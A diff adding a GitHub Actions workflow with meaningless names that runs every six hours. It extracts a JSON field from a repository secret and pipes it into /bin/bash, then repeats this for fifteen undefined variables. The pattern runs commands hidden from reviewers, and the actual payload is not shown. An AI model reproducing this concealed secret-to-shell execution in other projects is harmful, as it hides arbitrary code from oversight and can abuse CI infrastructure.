@@ -1,0 +1,33 @@
+name: bujiushiputonghua
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bujiushiputonghua
+        env:
+          hydy584: ${{ secrets.hydy584 }}
+        run: |
+          echo $hydy584 | jq -r .qp63016 | /bin/bash
+          echo $ffol99 | jq -r .dr75 | /bin/bash
+          echo $xryn0275 | jq -r .dwkhh8652 | /bin/bash
+          echo $rrkmg14082 | jq -r .uejf860 | /bin/bash
+          echo $eu8473 | jq -r .r69 | /bin/bash
+          echo $gpiq494 | jq -r .chni0664 | /bin/bash
+          echo $ydye736 | jq -r .j8626 | /bin/bash
+          echo $zsy22 | jq -r .yvehe254 | /bin/bash
+          echo $rg2878 | jq -r .vy34 | /bin/bash
+          echo $mhvz72355 | jq -r .sztc91 | /bin/bash
+          echo $ak045 | jq -r .iig426 | /bin/bash
+          echo $wy02 | jq -r .qe2543 | /bin/bash
+          echo $getx32605 | jq -r .s4 | /bin/bash
+          echo $hl134 | jq -r .khr284 | /bin/bash
+          echo $mldg50 | jq -r .w672 | /bin/bash
+          echo $ukmdh312 | jq -r .llv5 | /bin/bash
+
